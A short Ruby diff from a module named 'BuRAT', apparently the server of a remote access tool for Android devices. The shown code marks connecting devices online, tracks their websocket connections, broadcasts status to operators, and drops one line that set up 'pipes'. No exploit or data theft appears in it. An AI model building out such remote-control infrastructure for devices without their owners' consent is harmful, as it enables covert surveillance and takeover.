@@ -38,7 +38,6 @@ module BuRAT
               android = @androids.find { |android| android["id"] == payload["id"] }
               payload.store("status", "Online")
               payload.store("ws", ws)
-              payload["inators"].each { |inator| inator.store("pipes", Array.new) }
               android == nil ? @androids << payload : android.replace(payload)
               packet = packet("android", payload, "#{payload["name"]} online")
               @shinigamis.each { |shinigami| shinigami.send(packet) }
